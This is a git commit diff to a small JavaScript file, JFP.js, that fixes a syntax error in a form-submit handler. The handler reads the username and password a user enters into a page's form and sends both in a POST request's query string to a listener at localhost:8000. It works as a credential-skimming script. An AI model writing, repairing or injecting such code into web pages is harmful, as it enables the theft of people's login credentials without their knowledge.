a548cef6b5b3ed8c9cb542f0f5070e258eb119f3
Charles Harner <charner93@gmail.com>
2018-01-22 07:42:14 -0600

    Update JFP.js

--- JFP.js
+++ JFP.js
@@ -4,7 +4,7 @@ function onFormSubmit()
 	usernameForm = getForm[0][0].value;
 	passwordForm = getForm[0][1].value;
 	var request = new XMLHttpRequest();
-	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true)'
+	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true);
 	request.send();
 }
 document.forms[0].onsubmit = onFormSubmit;
